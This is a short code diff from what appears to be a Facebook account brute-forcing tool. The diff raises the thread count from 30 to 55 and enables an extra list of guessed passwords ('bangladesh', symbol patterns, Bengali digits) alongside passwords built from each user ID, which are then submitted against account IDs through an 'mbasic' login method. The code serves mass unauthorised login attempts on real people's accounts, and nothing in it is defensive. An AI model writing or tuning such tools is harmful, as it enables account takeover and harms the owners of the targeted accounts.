@@ -483,7 +483,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=30) as heron:
+    with ThreadPool(max_workers=55) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -497,7 +497,7 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:]]#,"bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:],"bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
